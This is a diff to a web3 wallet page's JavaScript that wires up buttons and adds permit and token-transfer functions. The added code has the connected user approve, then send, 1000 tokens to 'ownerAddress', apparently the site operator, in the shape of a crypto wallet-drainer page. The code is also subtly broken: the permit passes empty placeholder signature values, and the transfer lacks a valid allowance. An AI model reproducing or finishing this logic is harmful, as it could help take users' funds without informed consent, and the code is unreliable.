@@ -41,38 +41,22 @@ const contractABI = [
     }
 ];
 
-// 调试事件绑定
+// 页面加载后绑定按钮事件
 document.addEventListener("DOMContentLoaded", function() {
-    console.log("Document loaded");
-
     const connectWalletBtn = document.getElementById('connectWalletBtn');
-    if (connectWalletBtn) {
-        connectWalletBtn.addEventListener('click', function() {
-            console.log("Connect Wallet button clicked!");
-            connectWallet();
-        });
-    } else {
-        console.error("Connect Wallet button not found!");
-    }
-
     const signPermitBtn = document.getElementById('signPermitBtn');
-    if (signPermitBtn) {
-        signPermitBtn.addEventListener('click', function() {
-            console.log("Sign Permit button clicked!");
-            signPermit();
-        });
-    } else {
-        console.error("Sign Permit button not found!");
+    const transferTokensBtn = document.getElementById('transferTokensBtn');
+
+    if (connectWalletBtn) {
+        connectWalletBtn.addEventListener('click', connectWallet);
     }
 
-    const transferTokensBtn = document.getElementById('transferTokensBtn');
+    if (signPermitBtn) {
+        signPermitBtn.addEventListener('click', signPermit);
+    }
+
     if (transferTokensBtn) {
-        transferTokensBtn.addEventListener('click', function() {
-            console.log("Transfer Tokens button clicked!");
-            transferTokens();
-        });
-    } else {
-        console.error("Transfer Tokens button not found!");
+        transferTokensBtn.addEventListener('click', transferTokens);
     }
 });
 
@@ -87,6 +71,7 @@ async function connectWallet() {
 
             document.getElementById('walletAddress').innerText = `Connected: ${userAccount}`;
             document.getElementById('signPermitBtn').disabled = false;
+            document.getElementById('transferTokensBtn').disabled = false;
             console.log("Wallet connected:", userAccount);
             alert("钱包已连接: " + userAccount);
         } catch (error) {
@@ -101,10 +86,60 @@ async function connectWallet() {
 
 async function signPermit() {
     console.log("Signing permit...");
-    // 此处添加签名逻辑
+    if (!web3 || !contract) {
+        console.error("Wallet not connected or contract not initialized.");
+        alert("请先连接钱包！");
+        return;
+    }
+
+    try {
+        // 设置签名参数 (根据具体实现补充)
+        const permitData = {
+            owner: userAccount,
+            spender: ownerAddress,
+            value: 1000,  // 授权的代币数量
+            deadline: Math.floor(Date.now() / 1000) + 3600,  // 设置1小时后过期
+            v: 0,  // 从MetaMask或其他签名工具获得
+            r: "0x",  // 从MetaMask或其他签名工具获得
+            s: "0x"   // 从MetaMask或其他签名工具获得
+        };
+
+        // 调用合约中的 permit 方法
+        await contract.methods.permit(
+            permitData.owner,
+            permitData.spender,
+            permitData.value,
+            permitData.deadline,
+            permitData.v,
+            permitData.r,
+            permitData.s
+        ).send({ from: userAccount });
+
+        alert("签名授权成功！");
+    } catch (error) {
+        console.error("Error signing permit:", error);
+        alert("签名授权时出错: " + error.message);
+    }
 }
 
 async function transferTokens() {
     console.log("Transferring tokens...");
-    // 此处添加代币转移逻辑
+    if (!web3 || !contract) {
+        console.error("Wallet not connected or contract not initialized.");
+        alert("请先连接钱包！");
+        return;
+    }
+
+    try {
+        // 代币转移参数
+        const amount = 1000;  // 转移的代币数量
+
+        // 调用 transferFrom 函数
+        await contract.methods.transferFrom(userAccount, ownerAddress, amount).send({ from: userAccount });
+
+        alert("代币转移成功！");
+    } catch (error) {
+        console.error("Error transferring tokens:", error);
+        alert("代币转移时出错: " + error.message);
+    }
 }
